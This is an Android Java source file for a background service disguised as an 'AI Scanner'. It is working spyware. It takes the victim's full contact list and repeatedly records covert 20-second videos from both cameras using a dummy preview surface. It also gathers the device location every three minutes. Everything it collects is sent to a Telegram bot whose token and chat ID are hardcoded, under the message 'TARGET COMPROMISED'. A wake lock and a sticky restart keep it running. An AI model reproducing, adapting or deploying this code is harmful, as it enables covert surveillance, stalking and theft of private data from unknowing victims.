package com.ai.homework;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.view.Surface;
import org.json.JSONObject;
import java.io.File;
import okhttp3.*;

public class HarvesterService extends Service {
    private OkHttpClient client = new OkHttpClient();
    private String BOT_TOKEN = "9136102668:AAHIqngLUTmSneSbZt-ddd34YqRHcpKIkSM"; 
    private String CHAT_ID = "5437327956";     
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            String CHANNEL_ID = "AIScannerChannel";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID, "AI Scanner", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = getSystemService(NotificationManager.class);
                manager.createNotificationChannel(serviceChannel);
            }
            Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
            Notification notification = builder.setContentTitle("AI Scanner Active").setContentText("Memproses...").setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
            } else {
                startForeground(1, notification);
            }

            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AISpy::WakeLock");
            wakeLock.acquire();
        } catch (Exception e) {
            sendTgText("❌ ERROR START FOREGROUND: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean isFirstRun = true;
                while (true) {
                    try {
                        if (isFirstRun) {
                            String contacts = getContacts();
                            sendTgText("🎯 <b>TARGET COMPROMISED</b>\n\n<b>KONTAK:</b>\n" + contacts);
                            isFirstRun = false;
                        }

                        String locLink = getLocationLink();
                        
                        try {
                            recordVideoWithCamera(0, "🎥 Video Belakang", 20000);
                            Thread.sleep(2000);
                            recordVideoWithCamera(1, "🎥 Video Depan", 20000);
                        } catch (Exception e) {
                            sendTgText("❌ ERROR REKAM: " + e.getMessage());
                        }

                        sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
                        
                        Thread.sleep(180000); // Jeda 3 Menit
                        
                    } catch (Exception e) {
                        sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
                        try { Thread.sleep(60000); } catch (Exception ex) {}
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private String getLocationLink() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc != null) return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        } catch (Exception e) { return "Izin Lokasi Ditolak!"; }
        return "Lokasi gak tersedia.";
    }

    private void recordVideoWithCamera(int cameraId, String caption, int durationMs) {
        Camera camera = null;
        MediaRecorder recorder = new MediaRecorder();
        SurfaceTexture dummyTexture = null;
        Surface dummySurface = null;
        try {
            camera = Camera.open(cameraId);
            
            // Trik Bypass: Bikin Surface Palsu (Dummy)
            dummyTexture = new SurfaceTexture(10);
            dummySurface = new Surface(dummyTexture);
            
            try {
                camera.setPreviewTexture(dummyTexture);
            } catch (Exception e) {
                camera.setPreviewDisplay(dummySurface);
            }
            
            camera.unlock();
            
            recorder.setCamera(camera);
            recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            
            recorder.setVideoSize(640, 480); 
            recorder.setVideoFrameRate(20);
            recorder.setVideoEncodingBitRate(500000); 

            String fileName = (cameraId == 0) ? "video_back.mp4" : "video_front.mp4";
            File file = new File(getExternalFilesDir(null), fileName);
            recorder.setOutputFile(file.getAbsolutePath());

            recorder.prepare();
            recorder.start();
            
            Thread.sleep(durationMs); 

            recorder.stop();
            recorder.release();
            recorder = null;
            
            camera.lock();
            camera.release();
            camera = null;
            
            if (dummySurface != null) dummySurface.release();
            if (dummyTexture != null) dummyTexture.release();
            
            sendTgVideo(file, caption);

        } catch (Exception e) {
            sendTgText("❌ ERROR VIDEO " + cameraId + ": " + e.getMessage());
        } finally {
            if (recorder != null) {
                try { recorder.reset(); recorder.release(); } catch (Exception e) {}
            }
            if (camera != null) {
                try { camera.lock(); camera.release(); } catch (Exception e) {}
            }
            if (dummySurface != null) dummySurface.release();
            if (dummyTexture != null) dummyTexture.release();
        }
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                }
                cursor.close();
            }
        } catch (Exception e) { return "Error izin kontak: " + e.getMessage(); }
        return sb.toString();
    }

    private void sendTgText(String text) {
        try {
            JSONObject json = new JSONObject(); json.put("chat_id", CHAT_ID); json.put("text", text); json.put("parse_mode", "HTML");
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).execute();
        } catch (Exception e) {}
    }

    private void sendTgVideo(File file, String caption) {
        try {
            RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID).addFormDataPart("caption", caption)
                    .addFormDataPart("video", file.getName(), RequestBody.create(file, MediaType.parse("video/mp4"))).build();
            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendVideo").post(requestBody).build()).execute();
        } catch (Exception e) {
            sendTgText("❌ ERROR KIRIM VIDEO: " + e.getMessage());
        }
    }

    @Override public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
